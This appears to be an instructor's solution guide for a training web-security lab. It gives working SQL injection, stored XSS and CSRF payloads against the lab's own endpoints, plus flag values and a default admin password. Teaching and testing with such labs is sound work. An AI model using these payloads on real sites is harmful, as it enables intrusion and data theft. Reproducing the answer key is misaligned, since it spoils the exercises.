# #4CK P07470 — Exploitation Guide

Use this document to verify the labs end-to-end or to brief instructors on the
expected exploitation paths. Do **not** distribute to students unless you want
to hand out complete solutions.

> **Note:** `python init_db.py --csv ...` now preserves existing progress. Only
> add `--reset` if you intentionally want to wipe the SQLite DB (scores &
> submissions).

## Accounts

- Students: seeded via `data/students_sample.csv` (e.g., `SEC23001 / compass123`)
- Admin: `root / 4ck-potato!` (change via `init_db.py` for production)

## SQL Injection Labs

### 1. Leaderboard (`/sqli`)

- **Vector**: `term` parameter in the leaderboard search.
- **Goal**: Dump the `flags` table to recover `FLAG{query_the_matrix}`.
- **Payload**:
  ```
  %' UNION SELECT 1,code,999 FROM flags WHERE category='SQLI'--
  ```
- **Notes**: `leaderboard` has three columns, so we project `1,code,999` to match.

### 2. Executive Contracts (`/sqli/contracts`)

- **Vector**: `client` parameter in executive contract lookup.
- **Goal**: Read `FLAG{stacked_union_operatives}` from `flags`.
- **Payload**:
  ```
  %' UNION SELECT category,description,0,code
  FROM flags WHERE category='SQLI_ADV'--
  ```
- **Notes**: Column mapping → `client_name=category`, `scope=description`,
  `budget=0`, `confidential_notes=code`. Trailing `--` comments out the rest.

### 3. Blind Access Console (`/sqli/blind`)

- **Vector**: `guess` field posted to the vault console.
- **Goal**: Force the equality check to return true and reveal the flag.
- **Payload**:
  ```
  FLAG{garbage}' OR '1'='1 
  ```
- **Notes**: The backend executes
  `... WHERE category='SQLI_BLIND' AND code = '<guess>'`. Closing the string and
  injecting `OR 1=1--` yields `ACCESS GRANTED`, at which point the UI prints the
  real flag value (`FLAG{boolean_oracle}`) without exposing query text.

## Stored XSS Lab (`/xss`)

- **Vector**: Message textarea (rendered with `|safe` without sanitization).
- **Goal**: Execute JS to read `window.challengeFlags.xss`.
- **Payload**:
  ```
  <script>alert(window.challengeFlags.xss)</script>
  ```
  or log to console: `<script>console.log(window.challengeFlags.xss)</script>`
- **Flag**: `FLAG{stored_script_success}`

## CSRF Lab (`/csrf`)

- **Vector**: POST `/csrf/update-email` (no CSRF token, cookies sent with SameSite default).
- **Goal**: Force a victim to submit the form; read `window.challengeFlags.csrf`.
- **Exploit**:
  - Use `static/attacks/csrf_trap.html` or craft a similar page:
    ```html
    <form method="POST" action="http://localhost:5000/csrf/update-email">
      <input type="hidden" name="email" value="victim+pwned@example.com">
    </form>
    <script>document.forms[0].submit();</script>
    ```
  - After the forged request, visit `/csrf` and run
    `console.log(window.challengeFlags.csrf);`
- **Flag**: `FLAG{cross_site_rewrite}`

## Flag Submission (`/flags`)

- Enter the recovered flag in the appropriate card (SQLI / SQLI Contracts /
  SQLI Blind / XSS / CSRF).
- Points awarded = base value − (15 × prior captures of same flag), minimum 20.
- Student stats (`student_stats` table) track cumulative points and capture
  counts for leaderboard + admin reporting.

## Admin Console

- `/admin/login` → `/admin`
- Features: overview stats, live scoreboard, latest captures, DB download.
- Use for grading or to reset the SQLite file.

